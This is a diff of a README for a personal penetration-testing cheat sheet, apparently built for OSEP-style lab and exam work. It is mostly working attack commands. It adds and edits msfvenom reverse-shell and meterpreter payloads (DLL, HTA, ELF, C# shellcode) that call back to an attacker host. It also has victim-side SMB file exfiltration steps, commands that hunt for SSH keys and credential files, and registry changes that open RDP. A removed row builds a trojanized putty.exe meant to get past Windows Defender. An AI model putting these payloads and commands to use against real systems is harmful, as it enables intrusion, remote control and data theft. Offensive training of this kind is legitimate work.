@@ -5,11 +5,6 @@ This project was started as a means to better organize each repo along with a ho
 As such, this repo is still in private and will not be published as some of the exploits are challenge or exercise specific. 
 
 
-
-> [!NOTE]
-> Some of the tools and scripts in here weren’t made by me - huge thanks to everyone whose code contributed to this repository!<br>
-> Payloads consisting shellcode will not work with the XOR encryption of msfvenom. Instead, encrypt the shellcode by using the one provided [here](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/XOR%20Shellcode%20Encoder/Program.cs) or the GUI version available [here](https://github.com/Extravenger/OSEPlayground/tree/main/13%20-%20XOR-Encoder).
-
 - [1. Tunneling (Ligolo-NG)](#Tunneling---Ligolo-NG)
 - [2. Map The Network](#Map-The-Network)
 - [3. AMSI-Bypass](#AMSI-Bypass)
@@ -104,12 +99,17 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 - `runas.exe /netonly /user:final.com\nina cmd.exe`
 
+```bash
+# Sliver runas (windows only) run process in context of designated user
+runas --username --process --args (arguments for process) [--password] [--domain]
+```
+
 ### Set up SMB server (file transfer):
-- `smbserver.py share $(pwd) -smb2support -username amit -password password` 
+- `smbserver.py share $(pwd) -smb2support -username kali -password password` 
 
-- On Victim: `net use \\192.168.45.223\share /U:amit password` 
+- On Victim: `net use \\192.168.45.227\share /U:kali password` 
 
-- Copy files: `copy <FILENAME> \\192.168.45.223\share`
+- Copy files: `copy <FILENAME> \\192.168.45.227\share`
 
 ### Locate local/proof files
 - `tree /f /a C:\Users`
@@ -125,7 +125,7 @@ Search for SSH keys in Users directory:
 - `Get-ChildItem -Path C:\Users -Include .ssh -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-ChildItem -Path $_.FullName -File -Recurse -ErrorAction SilentlyContinue }`
 
 Search for interesting files:
-- `Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue`
+- `Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.ps1,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue`
 
 Powershell History Path:
 - `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
@@ -140,7 +140,7 @@ Using command prompt (Local):
 
 ```
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f && reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0 && netsh firewall set service remoteadmin enable && netsh firewall set service remotedesktop enable
-``` 
+```
 
 Using netexec (Remote):
 ```
@@ -384,22 +384,12 @@ impacket:
 | Read LAPS Password (Kerberos Auth)                    | KRB5CCNAME=ted.ccache bloodyAD -k --dc-ip "192.168.202.120" --host dc03.infinity.com -d "infinity.com" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
 
 # MSFVenom Payload Generation Cheetsheet
-
 | Name                            | Payload                                                                                                                                                                                                                        |
 | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| msfvenom DLL 64bit              | msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_64bit.dll                                                                                                                  |
-| msfvenom DLL 32bit              | msfvenom -p windows/reverse_tcp -ax86 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_32bit.dll                                                                                                                            |
-| BASH Reverse shell              | msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh                                                                                                                                                      |
-| JSP shell                       | msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp                                                                                                                                                |
-| Linux Reverse Shell             | msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                               |
-| Windows add user                | msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                                                                   |
-| HTA Reverse Shell               | sudo msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o evil.hta                                                                                                                                        |
-| Staged Payload for Windows x86  | msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x86.exe                                                                                                                                        |
-| Staged Payloads for Windows x64 | msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell-x64.exe                                                                                                                                    |
-| CMDEXEC                         | msfvenom -p windows/exec CMD="Your Command Here" -f exe -o shell.exe                                                                                                                                                         |
-| bind shell - x64                | msfvenom -p windows/x64/shell_bind_tcp LPORT=50001 RHOST=10.11.1.75 --platform windows -a x64 --format raw -o sc_x64_payload.bin                                                                                             |
-| Linux - x86 reverse shell       | msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf                                                                                                                                       |
-| Linux - x64 reverse shell       | msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf                                                                                                                                       |
-| Putty.exe WinDef Bypass         | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.175 LPORT=8443 EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o /mnt/Projects/test4.exe -e x64/xor_dynamic -i 10 -x ./putty.exe -k |
-| 64bit Staged Shellcode          | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c                                                                                                                                         |
-| 64bit NonStaged Shellcode       | msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.100.102.188 LPORT=9001 -f c`             
+| Sliver 64bit Staged             | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8064 EXITFUNC=thread -f csharp |
+| Sliver 32bit Staged             | msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8086 EXITFUNC=thread -f csharp |
+| msfvenom DLL 64bit              | msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=8064 -f dll > reverse_64bit.dll |
+| msfvenom DLL 32bit              | msfvenom -p windows/reverse_tcp -a x86 LHOST=192.168.45.227 LPORT=8064 -f dll > reverse_32bit.dll |
+| HTA Reverse Shell               | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8064 -f hta-psh -o evil.hta |
+| Linux - x86 reverse shell       | msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x86.elf |
+| Linux - x64 reverse shell       | msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x64.elf |
